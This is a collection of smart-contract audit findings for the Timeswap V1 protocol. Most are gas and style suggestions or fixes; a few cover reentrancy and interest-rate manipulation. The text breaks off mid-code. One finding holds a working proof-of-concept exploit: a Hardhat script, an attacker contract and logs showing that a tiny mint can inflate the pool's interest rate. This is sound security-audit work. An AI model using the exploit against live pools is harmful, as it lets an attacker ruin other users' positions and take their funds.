# Handle  0x1f8b   # Vulnerability details  ## Impact Gas saving.  ## Proof of Concept Moving the substraction inside the if condition in `TimeswapPair.withdraw` could be avoided the zero substraction.  ## Tools Used Manual review.  ## Recommended Mitigation Steps Change: ``` pool.state.reserves.asset -= tokensOut.asset;         pool.state.reserves.collateral -= tokensOut.collateral;          if (tokensOut.asset > 0) asset.safeTransfer(assetTo, tokensOut.asset);         if (tokensOut.collateral > 0) collateral.safeTransfer(collateralTo, tokensOut.collateral);. ``` to ```         if (tokensOut.asset > 0) { pool.state.reserves.asset -= tokensOut.asset; asset.safeTransfer(assetTo, tokensOut.asset); }         if (tokensOut.collateral > 0) { pool.state.reserves.collateral -= tokensOut.collateral; collateral.safeTransfer(collateralTo, tokensOut.collateral);. } ```  
# Handle  Jujic   # Vulnerability details  ## Impact Here you could use unchecked{++i} to save gas since it is more efficient then i++.  ``` for (uint256 i; i < ids.length; i++) {  ```  ## Proof of Concept https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L359  ## Tools Used Remix  ## Recommended Mitigation Steps  
# Handle  jayjonah8   # Vulnerability details  ## Impact In TimeswapConvenience.sol the constructor takes in 2 addresses for _factory and _weth and sets them in storage without checking that they are unique which can introduce possible costly errors during deployment.   ## Proof of Concept https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/TimeswapConvenience.sol#L62  ## Tools Used Manuel code review   ## Recommended Mitigation Steps Add to TimeswapConvenience.sol constructor:   require(_factory != _weth, "Duplicate address")  
# Handle  jayjonah8   # Vulnerability details  ## Impact In CollateralizedDebt.sol, the mint() function calls _safeMint() which has a callback to the "to" address argument.  Functions with callbacks should have reentrancy guards in place for protection against possible malicious actors both from inside and outside the protocol.    ## Proof of Concept https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L76  https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L263  https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L395  ## Tools Used Manual code review   ## Recommended Mitigation Steps Add a reentrancy guard modifier on the mint() function in CollateralizedDebt.sol   
# Handle  danb   # Vulnerability details  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/libraries/MintMath.sol#L65  ``` y <= x ``` can be removed  
# Handle  danb   # Vulnerability details  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/TimeswapConvenience.sol#L69  the contract should receive ether only from weth,  consider adding:  ``` require(msg.sender == weth); ```  
# Handle  robee   # Vulnerability details  The function dueOf in CollateralizedDebt.sol could be set external   
# Handle  jayjonah8   # Vulnerability details  ## Impact In TimeswapPair.sol the pay() function calls safeTransfer() and does so using the SafeTransfer.sol library when it can simply add the open zeppelin SafeERC20.sol import directly inside TimeswapPair.sol itself eliminating the unnecessary code in the protocols own SafeTransfer library.   ## Proof of Concept https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L374  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/libraries/SafeTransfer.sol#L7  ## Tools Used Manual code review   ## Recommended Mitigation Steps Use the open zeppelin SafeERC20 import directly inside the TimeswapPair.sol file instead of calling your own library.  The extra safeTransfer library can then be deleted.   
# Handle  jayjonah8   # Vulnerability details  ## Impact In TimeswapPair.sol, the pay() function has a callback to the msg.sender in the middle of the function while there are still updates to state that take place after the callback.  The lock modifier guards against reentrancy but not against cross function reentrancy.  Since the protocol implements Uniswap like functionality,  this can be extremely dangerous especially with regard to composability/interacting with other protocols and contracts.  The callback before important state changes (updates to reserves collateral and reserves assets) also violates the Checks Effects Interactions best practices further widening the attack surface.   ## Proof of Concept https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L369  https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html  cross function reentrancy https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21  ## Tools Used Manual code review   ## Recommended Mitigation Steps The callback "if (assetIn > 0) Callback.pay(asset, assetIn, data);"  should be placed at the end of the pay() function after all state updates have taken place.   
# Handle  jayjonah8   # Vulnerability details  ## Impact In TimeswapPair.sol, the borrow() function has a callback to the msg.sender in the middle of the function while there are still updates to state that take place after the callback.  The lock modifier guards against reentrancy but not against cross function reentrancy.  Since the protocol implements Uniswap like functionality,  this can be extremely dangerous especially with regard to composability/interacting with other protocols and contracts.  The callback before important state changes (updates to collateral, totalDebtCreated and reserves assets) also violates the Checks Effects Interactions best practices further widening the attack surface.   ## Proof of Concept https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L322  https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html  cross function reentrancy https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21  ## Tools Used Manual code review   ## Recommended Mitigation Steps The callback Callback.borrow(collateral, dueOut.collateral, data); should be placed at the end of the borrow() function after all state updates have taken place.   
# Handle  jayjonah8   # Vulnerability details  ## Impact In TimeswapPair.sol, the lend() function has a callback to the msg.sender in the middle of the function while there are still updates to state that take place after the callback.  The lock modifier guards against reentrancy but not against cross function reentrancy.  Since the protocol implements Uniswap like functionality,  this can be extremely dangerous especially with regard to composability/interacting with other protocols and contracts.  The callback before important state changes (updates to totalClaims bonds,  insurance and reserves assets) also violates the Checks Effects Interactions best practices further widening the attack surface.   ## Proof of Concept https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L246  https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html  cross function reentrancy https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21  ## Tools Used Manual code review   ## Recommended Mitigation Steps The callback Callback.lend(asset, xIncrease, data); should be placed at the end of the lend() function after all state updates have taken place.   
# Handle  jayjonah8   # Vulnerability details  ## Impact In TimeswapPair.sol, the mint() function has a callback in the middle of the function while there are still updates to state that take place after the callback.  The lock modifier guards against reentrancy but not against cross function reentrancy.  Since the protocol implements Uniswap like functionality,  this can be extremely dangerous especially with regard to composability/interacting with other protocols and contracts.  The callback before important state changes (updates to reserve asset, collateral, and totalDebtCreated) also violates the Checks Effects Interactions best practices further widening the attack surface.   ## Proof of Concept https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L177  https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html  cross function reentrancy https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21  ## Tools Used Manual code review   ## Recommended Mitigation Steps The callback Callback.mint(asset, collateral, xIncrease, dueOut.collateral, data) should be placed at the end of the mint() function after all state updates have taken place.   
# Handle  Rhynorater   # Vulnerability details  ## Impact Due to lack of constraints on user input in the `TimeswapPair.sol#mint` function, an attacker can arbitrarily modify the interest rate while only paying a minimal amount of Asset Token and Collateral Token.   Disclosure: This is my first time attempting Ethereum hacking, so I might have made some mistakes here since the math is quite complex, but I'm going to give it a go.   ## Proof of Concept The attack scenario is this: A malicious actor is able to hyper-inflate the interest rate on a pool by triggering a malicious mint function. The malicious actor does this to attack the LP and other members of the pool.   Consider the following HardHat script: ``` const hre = require("hardhat");   //jtok is asset //usdc is collat  async function launchTestTokens(tokenDeployer){     //Launch a token     const TestToken = await ethers.getContractFactory("TestToken", signer=tokenDeployer);     const tt = await TestToken.deploy("JTOK", "JTOK", 1000000000000000)     const tt2 = await TestToken.deploy("USDC", "USDC", 1000000000000000)     let res = await tt.balanceOf(tokenDeployer.address)     let res2 = await tt.balanceOf(tokenDeployer.address)     console.log("JTOK balance: "+res)     console.log("USDC balance: "+res2)     return [tt, tt2] }  async function deployAttackersContract(attacker, jtok, usdc){     const Att = await ethers.getContractFactory("Attacker", signer=attacker)     const atakcontrak = await Att.deploy(jtok.address, usdc.address)     return atakcontrak }  async function deployLPContract(lp, jtok, usdc){     const LP = await ethers.getContractFactory("LP", signer=lp)     const lpc = await LP.deploy(jtok.address, usdc.address)     return lpc }  async function main() {     const [tokenDeployer, lp, attacker] = await ethers.getSigners();     let balance = await tokenDeployer.getBalance()     let factory = await ethers.getContractAt("TimeswapFactory", "0x5FbDB2315678afecb367f032d93F642f64180aa3", signer=tokenDeployer)     //let [jtok, usdc] = await launchTestTokens(tokenDeployer)     let jtok = await ethers.getContractAt("TestToken", "0x2279b7a0a67db372996a5fab50d91eaa73d2ebe6", signer=tokenDeployer)     let usdc = await ethers.getContractAt("TestToken", "0x8a791620dd6260079bf849dc5567adc3f2fdc318", signer=tokenDeployer)     console.log("Jtok: "+jtok.address)     console.log("USDC: "+usdc.address)      //Create Pair     //let txn = await factory.createPair(jtok.address, usdc.address)     pairAddress = await factory.getPair(jtok.address, usdc.address)     pair = await ethers.getContractAt("TimeswapPair", pairAddress, signer=tokenDeployer)     console.log("Pair address: "+pairAddress);      // Deploy LP     //let lpc = await deployLPContract(lp, jtok, usdc)     let lpc = await ethers.getContractAt("LP", "0x948b3c65b89df0b4894abe91e6d02fe579834f8f", signer=lp)       let jtokb = await jtok.balanceOf(lpc.address)     let usdcb = await usdc.balanceOf(lpc.address)     console.log("LP Jtok: "+jtokb)     console.log("LP USDC: "+usdcb)      //let txn2 = await lpc.timeswapMint(1641859791, 15, pairAddress)     let res = await pair.constantProduct(1641859791);     console.log("Post LP Constants:", res);      let atakcontrak = await deployAttackersContract(attacker, jtok, usdc)      jtokb = await jtok.balanceOf(atakcontrak.address)     usdcb = await usdc.balanceOf(atakcontrak.address)     console.log("Attacker Jtok: "+jtokb)     console.log("Attacker USDC: "+usdcb)      //mint some tokens     let txn2 = await atakcontrak.timeswapMint(1641859791, 15, pairAddress)      let res2 = await pair.constantProduct(1641859791);     console.log("Post Attack Constants:", res2);  } main().then(()=>process.exit(0))  ```  First, the LP deploys their pool and contributes their desired amount of tokens with the below contract: ``` pragma solidity =0.8.4;  import "hardhat/console.sol"; import {ITimeswapMintCallback} from "./interfaces/callback/ITimeswapMintCallback.sol"; import {IPair} from "./interfaces/IPair.sol"; import {IERC20} from '@openzeppelin/contracts/token/ERC20/IERC20.sol'; interface TestTokenLP is IERC20{     function mmint(uint256 amount) external; }  contract LP is ITimeswapMintCallback {      uint112 constant SEC_PER_YEAR = 31556926;     TestTokenLP internal jtok;     TestTokenLP internal usdc;  constructor(address _jtok, address _usdc){     jtok = TestTokenLP(_jtok);     jtok.mmint(10_000 ether);     usdc = TestTokenLP(_usdc);     usdc.mmint(10_000 ether); }  function timeswapMint(uint maturity, uint112 APR, address pairAddress) public{     uint256 maturity = maturity;     console.log("Maturity: ", maturity);     address liquidityTo = address(this);     address dueTo = address(this);     uint112 xIncrease = 5_000 ether;     uint112 yIncrease = (APR*xIncrease)/(SEC_PER_YEAR*100);     uint112 zIncrease = (5*xIncrease)/3; //Static 167% CDP     IPair(pairAddress).mint(maturity, liquidityTo, dueTo, xIncrease, yIncrease, zIncrease, ""); }   function timeswapMintCallback(         uint112 assetIn,         uint112 collateralIn,         bytes calldata data     ) override external{         jtok.mmint(100_000 ether);         usdc.mmint(100_000 ether);         console.log("Asset requested:", assetIn);         console.log("Collateral requested:", collateralIn);         //check before         uint256 beforeJtok = jtok.balanceOf(msg.sender);         console.log("LP jtok before", beforeJtok);         //transfer         jtok.transfer(msg.sender, assetIn);         //check after         uint256 afterJtok = jtok.balanceOf(msg.sender);         console.log("LP jtok after", afterJtok);         //check before         uint256 beforeUsdc = usdc.balanceOf(msg.sender);         console.log("LP USDC  before", beforeUsdc);         //transfer         usdc.transfer(msg.sender, collateralIn);         //check after         uint256 afterUsdc = usdc.balanceOf(msg.sender);         console.log("LP USDC After", afterUsdc);              } }  ``` Here are the initialization values: ```     uint112 xIncrease = 5_000 ether;     uint112 yIncrease = (APR*xIncrease)/(SEC_PER_YEAR*100);     uint112 zIncrease = (5*xIncrease)/3; //Static 167% CDP ``` With this configuration, I've calculated the interest rate to borrow on this pool using the functions defined here: https://timeswap.gitbook.io/timeswap/deep-dive/borrowing to  be: ``` yMax: 4.7533146923118e-06 Min Interest Rate: 0.009374999999999765 Max Interest Rate: 0.14999999999999625 zMax: 1666.6666666666667  ``` Around 1% to 15%.   Then, the attacker comes along (see line containing `let atakcontrak` and after). The attacker deploys the following contract: ``` pragma solidity =0.8.4;  import "hardhat/console.sol"; import {ITimeswapMintCallback} from "./interfaces/callback/ITimeswapMintCallback.sol"; import {IPair} from "./interfaces/IPair.sol"; import {IERC20} from '@openzeppelin/contracts/token/ERC20/IERC20.sol'; interface TestTokenAtt is IERC20{     function mmint(uint256 amount) external; }  contract Attacker is ITimeswapMintCallback {      uint112 constant SEC_PER_YEAR = 31556926;     TestTokenAtt internal jtok;     TestTokenAtt internal usdc;  constructor(address _jtok, address _usdc){     jtok = TestTokenAtt(_jtok);     jtok.mmint(10_000 ether);     usdc = TestTokenAtt(_usdc);     usdc.mmint(10_000 ether); }  function timeswapMint(uint maturity, uint112 APR, address pairAddress) public{     uint256 maturity = maturity;     console.log("Maturity: ", maturity);     address liquidityTo = address(this);     address dueTo = address(this);     uint112 xIncrease = 3;     uint112 yIncrease = 1000000000000000;     uint112 zIncrease = 5; //Static 167% CDP     IPair(pairAddress).mint(maturity, liquidityTo, dueTo, xIncrease, yIncrease, zIncrease, ""); }   function timeswapMintCallback(         uint112 assetIn,         uint112 collateralIn,         bytes calldata data     ) override external{         jtok.mmint(100_000 ether);         usdc.mmint(100_000 ether);         console.log("Asset requested:", assetIn);         console.log("Collateral requested:", collateralIn);         //check before         uint256 beforeJtok = jtok.balanceOf(msg.sender);         console.log("Attacker jtok before", beforeJtok);         //transfer         jtok.transfer(msg.sender, assetIn);         //check after         uint256 afterJtok = jtok.balanceOf(msg.sender);         console.log("Attacker jtok after", afterJtok);         //check before         uint256 beforeUsdc = usdc.balanceOf(msg.sender);         console.log("Attacker USDC  before", beforeUsdc);         //transfer         usdc.transfer(msg.sender, collateralIn);         //check after         uint256 afterUsdc = usdc.balanceOf(msg.sender);         console.log("Attacker USDC After", afterUsdc);              } } ```  Which contains the following settings for a mint: ```     uint112 xIncrease = 3;     uint112 yIncrease = 1000000000000000;     uint112 zIncrease = 5; //Static 167% CDP ```  According to my logs in hardhat: ```     Maturity:  1641859791     Callback before: 8333825816710789998373     Asset requested: 3     Collateral requested: 6     Attacker jtok before 5000000000000000000000     Attacker jtok after 5000000000000000000003     Attacker USDC  before 8333825816710789998373     Attacker USDC After 8333825816710789998379     Callback after: 8333825816710789998379     Callback expected after: 8333825816710789998379  ``` The attacker is only required to pay 3 wei of Asset Token and 6 wei of Collateral token. However, after the attacker's malicious mint is up, the interest rate becomes: ``` yMax: 0.0002047533146923118 Min Interest Rate: 0.40383657499999975 Max Interest Rate: 6.461385199999996 zMax: 1666.6666666666667 ``` Between 40 and 646 percent.   xyz values before and after: ``` Post LP Constants: [ BigNumber { value: "5000000000000000000000" },   BigNumber { value: "23766573461559" },   BigNumber { value: "8333333333333333333333" },   x: BigNumber { value: "5000000000000000000000" },   y: BigNumber { value: "23766573461559" },   z: BigNumber { value: "8333333333333333333333" } ] Attacker Jtok: 10000000000000000000000 Attacker USDC: 10000000000000000000000 Post Attack Constants: [ BigNumber { value: "5000000000000000000003" },   BigNumber { value: "1023766573461559" },   BigNumber { value: "8333333333333333333338" },   x: BigNumber { value: "5000000000000000000003" },   y: BigNumber { value: "1023766573461559" },   z: BigNumber { value: "8333333333333333333338" } ]  ```  This result in destruction of the pool.   
# Handle  Rhynorater   # Vulnerability details  In `BurnMath.sol` we have the following function defined; ```     function getAsset(IPair.State memory state, uint256 liquidityIn) internal pure returns (uint128 assetOut) {         if (state.reserves.asset <= state.totalClaims.bond) return assetOut;          uint256 _assetOut = state.reserves.asset;         _assetOut -= state.totalClaims.bond;         _assetOut = _assetOut.mulDiv(liquidityIn, state.totalLiquidity);         assetOut = _assetOut.toUint128(); } ``` Since the above `if` statement ensures that `state.reserves.asset` is  not less than or equal to `state.totalClaims.bond`, it is impossible for the `_assetOut -= state.totalClaims.bond; ` line to underflow. As a result, adding the `unchecked` directive around this will save on gas.  By the same reasoning, in the `getCollateral` function: ``` deficit -= state.reserves.asset; ``` is already checked by the  ``` if (state.reserves.asset >= state.totalClaims.bond) { ``` `if` statement. Surrounding this with `unchecked` will also save on gas.  Lastly, this also applies in `WithdrawMath.sol#getCollateral`: ```         if (state.reserves.asset >= state.totalClaims.bond) return collateralOut;         uint256 deficit = state.totalClaims.bond;         deficit -= state.reserves.asset; ``` The deficit will never underflow here, so adding `unchecked` will save on gas.   ##References https://github.com/code-423n4/2022-01-timeswap/blob/5960e07d39f2b4a60cfabde1bd51f4b1e62e7e85/Timeswap/Timeswap-V1-Core/contracts/libraries/BurnMath.sol#L22 https://github.com/code-423n4/2022-01-timeswap/blob/5960e07d39f2b4a60cfabde1bd51f4b1e62e7e85/Timeswap/Timeswap-V1-Core/contracts/libraries/BurnMath.sol#L41 https://github.com/code-423n4/2022-01-timeswap/blob/5960e07d39f2b4a60cfabde1bd51f4b1e62e7e85/Timeswap/Timeswap-V1-Core/contracts/libraries/WithdrawMath.sol#L33   
# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L132-L132  ```solidity if (significantDigits > 10 ** 9) { ```  Can be changed to:  ```solidity if (significantDigits > 1e9) { ```  
# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/SquareRoot.sol#L19-L22  ```solidity function sqrtUp(uint256 y) internal pure returns (uint256 z) {     z = sqrt(y);     if (z % y > 0) z++; } ```  For example, when `y = 9`: -   At L20, z = sqrt(9) = 3 -   At L21, z % y = 3 % 9 = 3, so that `z % y > 0` is true, therefore, `z++`, z is 4   Expected Results: sqrtUp(9) = 4  Actual Results: sqrtUp(9) = 3  ### Recommendation  Change to:  ```solidity function sqrtUp(uint256 y) internal pure returns (uint256 z) {     z = sqrt(y);     if (z * z < y) ++z; } ``` or  ```solidity function sqrtUp(uint256 y) internal pure returns (uint256 z) {     z = sqrt(y);     if (y % z != 0) ++z; } ```  
# Handle  WatchPug   # Vulnerability details  The check of `y > 3` is unnecessary and most certainly adds more gas cost than it saves as the majority of use cases of this function will not be handling `y <= 3`.  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/SquareRoot.sol#L6-L17  ```solidity function sqrt(uint256 y) internal pure returns (uint256 z) {     if (y > 3) {         z = y;         uint256 x = y / 2 + 1;         while (x < z) {             z = x;             x = (y / x + x) / 2;         }     } else if (y != 0) {         z = 1;     } } ```  ### Recommendation  Change to:  ```solidity function sqrt(uint x) public pure returns (uint y) {     uint z = (x + 1) / 2;     y = x;     while (z < y) {         y = z;         z = (x / z + z) / 2;     } } ```  Or use:  https://github.com/Rari-Capital/solmate/blob/dd13c61b5f9cb5c539a7e356ba94a6c2979e9eb9/src/utils/FixedPointMathLib.sol#L150-L205   
# Handle  WatchPug   # Vulnerability details  Check input value earlier can avoid unnecessary code execution when this check failed.  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/SafeCast.sol#L13-L15  ```solidity function toUint128(uint256 x) internal pure returns (uint128 y) {     require((y = uint128(x)) == x); } ```  See: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4961a51cc736c7d4aa9bd2e11e4cbbaff73efee9/contracts/utils/math/SafeCast.sol#L48  ### Recommendation  Change to:  ```solidity function toUint128(uint256 value) internal pure returns (uint128) {     require(value <= type(uint128).max, "SafeCast: value doesn't fit in 128 bits");     return uint128(value); } ```  `SafeCast.sol#toUint112()` got the similar issue.  
# Handle  0x0x0x   # Vulnerability details  ## Impact  `!= 0` is a cheaper operation compared to `> 0`, when dealing with `uint`.  ## Occurrences  ```  ./Timeswap-V1-Convenience/contracts/base/ERC721.sol:147:            } else if (_return.length > 0) { ./Timeswap-V1-Convenience/contracts/libraries/Burn.sol:40:        if (tokensOut.asset > 0) { ./Timeswap-V1-Convenience/contracts/libraries/Burn.sol:65:        if (tokensOut.collateral > 0) { ./Timeswap-V1-Convenience/contracts/libraries/DateTime.sol:128:        if (year >= 1970 && month > 0 && month <= 12) { ./Timeswap-V1-Convenience/contracts/libraries/DateTime.sol:130:            if (day > 0 && day <= daysInMonth) { ./Timeswap-V1-Convenience/contracts/libraries/Mint.sol:296:        require(pair.totalLiquidity(params.maturity) > 0, 'E507'); ./Timeswap-V1-Convenience/contracts/libraries/Mint.sol:455:        require(pair.totalLiquidity(params.maturity) > 0, 'E507'); ./Timeswap-V1-Convenience/contracts/libraries/Mint.sol:614:        require(pair.totalLiquidity(params.maturity) > 0, 'E507'); ./Timeswap-V1-Convenience/contracts/libraries/Pay.sol:86:        if (collateralOut > 0) { ./Timeswap-V1-Convenience/contracts/libraries/PayMath.sol:27:                if (due.debt > 0) { ./Timeswap-V1-Convenience/contracts/libraries/SquareRoot.sol:21:        if (z % y > 0) z++; ./Timeswap-V1-Convenience/contracts/libraries/Withdraw.sol:40:        if (tokensOut.asset > 0) { ./Timeswap-V1-Convenience/contracts/libraries/Withdraw.sol:58:        if (tokensOut.collateral > 0) { ./Timeswap-V1-Convenience/contracts/libraries/Withdraw.sol:75:        if (params.claimsIn.bond > 0) ./Timeswap-V1-Convenience/contracts/libraries/Withdraw.sol:77:        if (params.claimsIn.insurance > 0) ./Timeswap-V1-Core/contracts/TimeswapPair.sol:153:        require(xIncrease > 0 && yIncrease > 0 && zIncrease > 0, 'E205'); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:170:        require(liquidityOut > 0, 'E212'); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:203:        require(liquidityIn > 0, 'E205'); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:217:        if (tokensOut.asset > 0) asset.safeTransfer(assetTo, tokensOut.asset); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:218:        if (tokensOut.collateral > 0) collateral.safeTransfer(collateralTo, tokensOut.collateral); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:236:        require(xIncrease > 0, 'E205'); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:239:        require(pool.state.totalLiquidity > 0, 'E206'); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:274:        require(claimsIn.bond > 0 || claimsIn.insurance > 0, 'E205'); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:292:        if (tokensOut.asset > 0) asset.safeTransfer(assetTo, tokensOut.asset); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:293:        if (tokensOut.collateral > 0) collateral.safeTransfer(collateralTo, tokensOut.collateral); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:311:        require(xDecrease > 0, 'E205'); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:314:        require(pool.state.totalLiquidity > 0, 'E206'); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:369:        if (assetIn > 0) Callback.pay(asset, assetIn, data); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:374:        if (collateralOut > 0) collateral.safeTransfer(to, collateralOut); ./Timeswap-V1-Core/contracts/libraries/FullMath.sol:34:                require(denominator > 0); ./Timeswap-V1-Core/contracts/libraries/FullMath.sol:124:        if (mulmod(a, b, denominator) > 0) result++; ./Timeswap-V1-Core/contracts/libraries/Math.sol:7:        if (x % y > 0) z++;  ```  
# Handle  WatchPug   # Vulnerability details  Every reason string takes at least 32 bytes.  Use short reason strings that fits in 32 bytes or it will become more expensive.  Instances include:  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/base/ERC721.sol#L55-L58  ```solidity require(     owner == msg.sender || isApprovedForAll[owner][msg.sender],     'ERC721 :: approve : Approve caller is not owner nor approved for all' ); ```  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/base/ERC721.sol#L96-L99  ```solidity require(     _checkOnERC721Received(address(0), to, id, ''),     'ERC721 :: _safeMint : Transfer to non ERC721Receiver implementer' ); ```  
# Handle  WatchPug   # Vulnerability details  There is no risk of overflow caused by increamenting the iteration index in for loops (the `i++` in for `for (uint256 i; i < ids.length; i++)`).  Increments perform overflow checks that are not necessary in this case.  ### Recommendation  Surround the increment expressions with an `unchecked { ... }` block to avoid the default overflow checks. For example, change the for loop:   https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/PayMath.sol#L21-L33  ```solidity for (uint256 i; i < ids.length; i++) {     IPair.Due memory due = pair.dueOf(maturity, address(collateralizedDebt), ids[i]);      if (assetsIn[i] > due.debt) assetsIn[i] = due.debt;     if (msg.sender == collateralizedDebt.ownerOf(ids[i])) {         uint256 _collateralOut = due.collateral;         if (due.debt > 0) {             _collateralOut *= assetsIn[i];             _collateralOut /= due.debt;         }         collateralsOut[i] = _collateralOut.toUint112();     } } ```  to:  ```solidity for (uint256 i; i < ids.length;) {     IPair.Due memory due = pair.dueOf(maturity, address(collateralizedDebt), ids[i]);      if (assetsIn[i] > due.debt) assetsIn[i] = due.debt;     if (msg.sender == collateralizedDebt.ownerOf(ids[i])) {         uint256 _collateralOut = due.collateral;         if (due.debt > 0) {             _collateralOut *= assetsIn[i];             _collateralOut /= due.debt;         }         collateralsOut[i] = _collateralOut.toUint112();     }      unchecked { ++i; } } ```   
# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/BorrowMath.sol#L19-L53  This issue is similar to the two previous issues related to `state.y` manipulation. Unlike the other two issues, this function is not on `TimeswapPair.sol` but on `TimeswapConvenience.sol`, therefore this can not be solved by adding `onlyConvenience` modifier.  Actually, we believe that it does not make sense for the caller to specify the interest they want to pay, we recommend removing this function.  ## Impact  - When `pool.state.y` is extremely large, many core features of the protocol will malfunction, as the arithmetic related to `state.y` can overflow. For example:  LendMath.check(): https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/LendMath.sol#L28-L28  BorrowMath.check(): https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/BorrowMath.sol#L31-L31  - An attacker can set `state.y` to a near overflow value, then `lend()` to get a large amount of extra interest (as Bond tokens) with a small amount of asset tokens. This way, the attacker can steal funds from other lenders and liquidity providers.   
# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/MintMath.sol#L14-L34  The current implementation of `TimeswapPair.sol#mint()` allows the caller to specify an arbitrary value for `yIncrease`.  However, since `state.y` is expected to be a large number based at `2**32`, once the initial `state.y` is set to a small number (1 wei for example), the algorithm won't effectively change `state.y` with regular market operations (`borrow`, `lend` and `mint`).  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/BorrowMath.sol#L17-L37  The pair with the maturity will malfunction and can only be abandoned.  A malicious user/attacker can use this to frontrun other users or the platform's `newLiquidity()` call to initiate a griefing attack.  If the desired `maturity` is a meaningful value for the user/platform, eg, end of year/quarter. This can be a noteworthy issue.  ## Recommendation  Consider adding validation of minimal `state.y` for new liquidity.  Can be `2**32 / 10000` for example.  
# Handle  WatchPug   # Vulnerability details  `checkProportional()` is a rather simple one line function, making it inline instead of an internal function call can make the code simpler and save some gas.  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L359-L368  ```solidity for (uint256 i; i < ids.length; i++) {     Due storage due = dues[ids[i]];     require(due.startBlock != BlockNumber.get(), 'E207');     if (owner != msg.sender) require(collateralsOut[i] == 0, 'E213');     PayMath.checkProportional(assetsIn[i], collateralsOut[i], due);     due.debt -= assetsIn[i];     due.collateral -= collateralsOut[i];     assetIn += assetsIn[i];     collateralOut += collateralsOut[i]; } ```  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/PayMath.sol#L7-L14  ```solidity function checkProportional(     uint112 assetIn,     uint112 collateralOut,     IPair.Due memory due ) internal pure {     require(uint256(assetIn) * due.collateral >= uint256(collateralOut) * due.debt, 'E303'); } } ```  Can be changed to:  ```solidity for (uint256 i; i < ids.length; i++) {     Due storage due = 